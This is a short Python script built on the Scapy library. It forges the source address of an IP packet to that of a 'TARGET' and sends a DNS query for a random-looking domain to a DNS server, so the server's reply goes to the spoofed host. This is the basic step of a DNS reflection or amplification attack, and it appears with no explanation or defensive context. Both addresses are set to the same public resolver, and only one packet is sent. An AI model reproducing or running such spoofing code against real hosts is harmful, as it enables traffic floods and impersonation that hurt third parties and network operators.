from scapy.all import *

TARGET = '8.8.8.8'
DNS_SERVER = ['8.8.8.8']

source_port = random.randint(1025, 10000)
ip_packet = IP(src=TARGET, dst=DNS_SERVER[0])
udp_packet = UDP(sport=source_port, dport=53)
dns_packet = DNS(rd = 1, qd=DNSQR(qname='asdqweqeasdasdsaqweqweqeq.com'))
pkt = ip_packet/udp_packet/dns_packet
send(pkt)